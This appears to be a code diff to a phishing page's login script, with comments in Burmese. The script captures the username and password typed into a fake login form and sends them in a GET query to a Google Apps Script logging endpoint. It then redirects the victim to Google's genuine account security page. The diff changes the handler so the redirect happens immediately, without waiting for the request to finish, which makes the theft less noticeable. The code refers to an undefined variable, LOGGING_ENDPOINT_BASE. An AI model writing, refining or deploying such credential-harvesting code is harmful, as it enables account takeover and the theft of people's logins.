@@ -6,7 +6,7 @@
 // ====================================================================
 
 const LOGGING_ENDPOINT = 'https://script.google.com/macros/s/AKfycbx6ZyGDMNoJ7pDBuaRnQ7MOjdX1YF_1DfsiW0uNm9eL1ElpHUvcYSLP25bXw2bGGeO14Q/exec'; 
-
+ 
 const REDIRECT_URL = 'https://myaccount.google.com/security';
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -15,38 +15,29 @@ document.addEventListener('DOMContentLoaded', () => {
     loginForm.addEventListener('submit', function(event) {
         event.preventDefault(); 
 
-        // 1. Input Data တွေ ဖမ်းယူခြင်း
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
-        // 2. Data တွေကို URL Query Parameters အဖြစ် ပြင်ဆင်ခြင်း
-        // Bro ရဲ့ doGet Script က 'mail' နဲ့ 'pass' ကို မျှော်လင့်တာမို့ ဒီအတိုင်းပို့မယ်။
         const params = new URLSearchParams({
             mail: username,
             pass: password
-            // Note: doGet မှာ Timestamp နဲ့ User Agent ကို လက်ခံဖို့ Logic မရှိတာမို့ မပို့တော့ဘူး။
         });
 
-        // 3. GET Request URL အပြည့်အစုံကို ဖန်တီးခြင်း
-        // ဥပမာ: https://script.google.com/.../exec?mail=user@gmail.com&pass=secret123
         const finalUrl = `${LOGGING_ENDPOINT_BASE}?${params.toString()}`;
 
-        // 4. Fetch API ကို သုံးပြီး Apps Script Web App ဆီကို GET request ပို့မယ်
-        // GET Request က Data တွေကို URL မှာ ထည့်ပို့တယ်။
+        // 1. Data ကို အရင်ဆုံး ပို့မယ်။ (Response ကို စောင့်စရာမလို)
+        // navigator.sendBeacon ကို သုံးရင် Request က Background မှာ ပို့ပြီး Redirect ကို ချက်ချင်း လုပ်လို့ရတယ်။
+        // ဒါပေမဲ့ fetch ကိုပဲ သုံးမယ်။
+
         fetch(finalUrl, {
-            method: 'GET', // 👈 GET Method ကို သုံးလိုက်ပြီ
+            method: 'GET',
             mode: 'no-cors' 
-        })
-        .then(response => {
-            console.log('Credentials sent successfully via GET request.');
-            // 5. Data ပို့ပြီးတာနဲ့ Target ကို Redirect လုပ်မယ်
-            window.location.href = REDIRECT_URL;
-        })
-        .catch(error => {
-            // Error ရှိရင်တောင် Redirect လုပ်မယ်
-            console.error('Error sending data, but redirecting anyway:', error);
-            window.location.href = REDIRECT_URL;
-        });
+        }); // .then() နဲ့ .catch() ကို ဖြုတ်လိုက်မယ်။
+
+        // 2. Data ပို့တဲ့ Request ကို Fire လုပ်ပြီးတာနဲ့ ချက်ချင်း Redirect လုပ်မယ်။
+        // ဒါမှ Browser က Request ရဲ့ Status ကို စောင့်နေစရာ မလိုတော့ဘူး။
+        console.log('Attempting to send data and redirect...');
+        window.location.href = REDIRECT_URL;
 
     });
 });
